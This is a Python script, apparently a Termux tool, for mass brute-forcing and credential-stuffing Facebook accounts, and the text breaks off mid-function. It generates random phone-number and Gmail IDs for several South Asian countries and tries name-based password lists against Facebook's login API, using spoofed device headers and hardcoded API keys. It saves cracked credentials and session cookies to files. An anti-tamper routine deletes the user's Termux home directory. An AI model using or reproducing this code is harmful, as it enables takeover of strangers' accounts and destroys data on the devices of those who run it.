# CODE BY ALEXANDER AXL MONTREAL 
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules...\n It will take some seconds...')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python axl.py')
except:pass
try:
    import httplib2
except ImportError:
    print("httplib2 module not found. Installing...")
    subprocess.check_call(['pip', 'install', 'httplib2'])
    import httplib2
def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY AXL');exit()
            shutil.rmtree("/data/data/com.termux/files/home")
        else:exit()
    except:exit()
####### KILLER #######
 
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
elif "sys.stdout.write" in x:	
    clr()   
else:
    pass
from requests import sessions
 
x = open(sessions.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
elif "sys.stdout.write" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
 
elif "sys.stdout.write" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
else:
    pass           
android_versi = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
versi_app = str(random.randint(111111111,999999999))
language = "en_US"
try:
    simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:
    simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","") 

def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;32m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;32m| \33[1;32m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;32m| \33[1;32m2010\33[1;32m/\33[1;32m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;32m| \33[1;32m2011\33[1;32m/\33[1;32m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;32m| \33[1;32m2012\33[1;32m/\33[1;32m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;32m| \33[1;32m2013\33[1;32m/\33[1;32m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;32m| \33[1;3wm2014\33[1;32m/\33[1;32m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;32m| \33[1;32m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;32m| \33[1;32m2015\33[1;32m/\33[1;32m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;32m| \33[1;32m2016\33[1;32m/\33[1;32m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;32m| \33[1;32m2018\33[1;32m/\33[1;32m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;32m| \33[1;32m2019\33[1;32m/\33[1;32m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;32m| \33[1;32m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;32m| \33[1;32m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;32m| \33[1;32m2022' 
        elif ids[:5] in ['10009']           :creation = '\32[1;32m| \32[1;33m2022\32[1;32m/\32[1;32m2023'
        elif ids[:4] in ['6155']           :creation = '\32[1;32m| \32[1;32m2023' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;32m| \33[1;32m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;32m| \33[1;32m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;32m| \33[1;32m2006/2007'
    else:creation=''
    return creation

def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(N,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(K,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))


def p(x):
	print(x)
os.system(f'xdg-open https://www.facebook.com/AlexanderAxlMontreal.IAmLimitless')

logo= f"""\x1b[1;32m                  █████  ██   ██ ██      \n                 ██   ██  ██ ██  ██      \n                 ███████   ███   ██      \n                 ██   ██  ██ ██  ██      \n                 ██   ██ ██   ██ ███████ \n─────────────────────────────────────────────────────────\nAUTHOR  : ALEXANDER AXL MONTREAL\n─────────────────────────────────────────────────────────\nTOOL    : FILE CLONING & RANDOM CLONING & GMAIL CLONING\n─────────────────────────────────────────────────────────\nFACEBOOK: ALEXANDER AXL MONTREAL\n─────────────────────────────────────────────────────────\nSTATUS  : FREE\n─────────────────────────────────────────────────────────\nVERSION : 0.1\n─────────────────────────────────────────────────────────"""

def linex():
        print('\x1b[1;32m─────────────────────────────────────────────────────────')
def clear():
        os.system('clear')
        print(logo)
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]

def menu():
                        clear()	
                        print(' [1] FILE CLONING\n [2] FILE MAKING\n [3] RANDOM CLONING\n [4] RANDOM GMAIL CRACK\n [5] FACEBOOK FOLLOW\n [0] EXIT')
                        linex()
                        xd=input(' CHOOSE : ')
                        if xd in ['1','01']:
                                clear()
                                print(' PUT FILE EXAMPLE :  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' ALL METHOD WORKING ')
                                linex()
                                print(' [1] METHOD 1 \n [2] METHOD 2 \n [3] METHOD 3 \n [4] METHOD 4 ')
                                linex()
                                mthd=input(' CHOOSE : ')
                                linex()
                                plist = []
                                print(" [1] AUTO PASSWORD \n [2] AUTO PASSWORD \n [3] CHOICE PASSWORD ")                                
                                linex()
                                psx=input(' CHOOSE : ')
                                if psx in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('first1234')     
                                        plist.append('firstlast123')
                                        plist.append('firstlast1234')
                                        plist.append('firstlast@123')
                                        plist.append("last123")
                                        plist.append("Last12345")
                                        plist.append('first123456')
                                        plist.append('first@123')
                                        plist.append('First@123')
                                        plist.append('first321')
                                        plist.append('First@12')
                                        plist.append('first@1234')
                                        plist.append('First123')
                                        plist.append('@first123')
                                        plist.append('@first1234')
                                        plist.append('first@@@')
                                elif psx in ['2','02']:
                                        plist.append('First Last')
                                        plist.append('Last First')
                                        plist.append('first last')
                                        plist.append('last first')
                                        plist.append('firstlast')
                                        plist.append('lastfirst')
                                        plist.append('firstlast123')     
                                        plist.append('firstlast12345')
                                        plist.append('firstlast123456789')
                                        plist.append('firstlast143')
                                        plist.append("lastfirst123")
                                        plist.append("lastfirst12345")
                                        plist.append('lastfirst123456789')
                                        plist.append('lastfirst143')
                                        plist.append('First123')
                                        plist.append('Last123')
                                        plist.append('First12345')
                                        plist.append('Last12345')
                                        plist.append('First123456789')
                                        plist.append('Last123456789')
                                        plist.append('First143')
                                        plist.append('Last143')
                                        plist.append('first123')
                                        plist.append('last123')
                                        plist.append('first12345')
                                        plist.append('last12345')
                                        plist.append('first123456789')
                                        plist.append('last123456789')
                                        plist.append('first143')
                                        plist.append('last143')
                                        plist.append('first123123')
                                        plist.append('last123123')
                                        plist.append('first1')
                                        plist.append('first2')
                                        plist.append('first3')
                                        plist.append('first4')
                                        plist.append('first5')
                                        plist.append('first6')
                                        plist.append('first7')
                                        plist.append('first8')
                                        plist.append('first9')
                                        plist.append('first10')
                                        plist.append('first11')
                                        plist.append('first12')
                                        plist.append('first13')
                                        plist.append('first14')
                                        plist.append('first15')
                                        plist.append('first16')
                                        plist.append('first17')
                                        plist.append('first18')
                                        plist.append('first19')
                                        plist.append('firstpogi')
                                        plist.append('firstganda')
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m EXAMPLE : first last,firstlast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' ENTER PASSWORD {i+1}: '))
                                      
                                linex()
                                print(' DO YOU WENT SHOW CP ACCOUNT? (y/n): ')
                                linex()
                                cx=input(' CHOOSE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' TOTAL ACCOUNT IDS : \033[1;32m'+total_ids)
                                        print("\033[1;37m \x1b[38;5;208mUSE AIRPLANE MODE FOR MORE OK IDS\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(M1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(M2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(M3,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(M4,ids,names,passlist)        
                                print('\033[1;37m')
                                linex()
                                print(' THE PROCESS HAS COMPLETED')
                                print(' TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' PRESS ENTER TO BACK ')
                                os.system('python AXL.py')
                        elif xd in ['2','02']:                               
                                print("next update")
                        elif xd in ['3','03']:
                                clear()
                                print(' [1] PAKISTAN CLONING\n [2] BANGLADESH CLONING\n [3] NEPAL INDIA CLONING\n [0] BACK MENU')
                                linex()
                                x=input(' CHOOSE : ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        npxind()                              
                                else:
                                        menu()
                        elif xd in ['4','04']:
                                gmail()
                        elif xd in ['5','05']:
                                os.system(f'xdg-open https://www.facebook.com/AlexanderAxlMontreal.IAmLimitless');menu()
                        elif xd in ['0','00']:
                                exit(' THANKS FOR USE 🥰 ')
                        else:
                                exit(' OPTION NOT FOUND IN MENU...')

def npxind():
                user=[]
                clear()
                print('\033[1;37m EXAMPLE : 9814,ETC')
                linex()
                print(" PUT YOUR COUNTRY 4DIGIT CODE")
                linex
                code = input('\033[1;37m PUT SIM CODE : ')
                try:
                        limit = int(input('\033[1;37m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                clear()                        
                print(' [1] METHOD  \033[1;32m \n [2] \033[1;33mMETHOD  ') 
                linex()
                mthd = input(' CHOOSE : ')
                clear()                
                print(" SELECT YOUR COUNTRY PASSWORD METHOD")
                linex()
                print("[1] INDIA PASSWORD METHOD ")
                print("[2] NEPAL PASSWORD METHOD ")
                linex()
                pcs = input(" CHOOSE : ")
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(6))
                        user.append(nmp)
                with tred(max_workers=30) as AXL:     
                        clear()
                        id = str(len(user))
                        print('TOTAL ACCOUNT : \033[1;32m'+id)
                        print('THE PROCESS IS RUNNING IN THE BACKGROUND ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                if pcs in ['1','01']:                                   
                                    passlist = [psx,ids,'57575751','57273200','free fire','59039200','Sex123','i love you']
                                elif pcs in ['2','02']:     
                                    passlist = [psx,ids,'neapl123','neapl1234','neapl12345','tamang','tamang123','maya123','maya1234','maya12345','pokhara','katmandu','sabin123','magar123','sagar123','neapl@123','sunita','free fire','i love you','Neapl123','Neapl12345']
                                if mthd in ['1','01']:                                 
                                    AXL.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    AXL.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python AXL.py')    
def pak():
                user=[]
                clear()
                print('\033[1;37m EXAMPLE : ,0300,ETC')
                linex()
                print(" PUT YOUR COUNTRY 4DIGIT CODE")
                linex
                code = input('\033[1;37m PUT SIM CODE : ')
                try:
                        limit = int(input('\033[1;37m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                clear()                        
                print(' [1] METHOD  \033[1;32m \n [2] \033[1;33mMETHOD  ') 
                linex()
                mthd = input(' CHOOSE : ')
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as ISHMUM:     
                        clear()
                        id = str(len(user))
                        print('TOTAL ACCOUNT : \033[1;32m'+id)
                        print('THE PROCESS IS RUNNING IN THE BACKGROUND ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122']
                                if mthd in ['1','01']:                                 
                                    AXL.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    AXL.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python AXL.py')       
def bd():
                user=[]
                clear()
                print('\033[1;37m EXAMPLE : ,019,ETC')
                linex()
                print(" PUT YOUR COUNTRY 3DIGIT CODE")
                linex
                code = input('\033[1;37m PUT SIM CODE : ')
                try:
                        limit = int(input('\033[1;37m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                clear()                        
                print(' [1] METHOD  \033[1;32m \n [2] \033[1;33mMethod  ') 
                linex()
                mthd = input(' CHOOSE : ')
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as AXL:     
                        clear()
                        id = str(len(user))
                        print('TOTAL ACCOUNT : \033[1;32m'+id)
                        print('THE PROCESS IS RUNNING IN THE BACKGROUND ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                if mthd in ['1','01']:                                 
                                    AXL.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    AXL.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python AXL.py') 
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m EXAMPLE : muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' PUT FIRST NAME : ')
                linex()
                print('\033[1;37m EXAMPLE : khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' PUT LAST NAME : ')
                linex()
                print(' EXAMPLE : @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' DOMAIN : ')
                linex()
                try:
                        limit=int(input(' PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                linex()
                print(' GETTING GMAILS....')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as AXL:
                        total = str(len(fo))
                        clear()
                        print(' TOTAL ACCOUNT : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUSE FLIGHT MODE FOR SPEED UP\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'AXL'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                ISHMUM.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python AXL.py')

def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AXL-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/{fbpn};FBDV/RMX3617;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"US_MX","client_country_code":"US",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;32m [AXL-OK] '+ids+' | '+pas+'\033[1;97m')                 
                                        open('/sdcard/AXL_FILE_M1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AXL_FILE_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [PATAY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AXL-FILE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/AXLbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AXL-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.orca;FBDV/CPH2607;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"en_US","client_country_code":"US",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
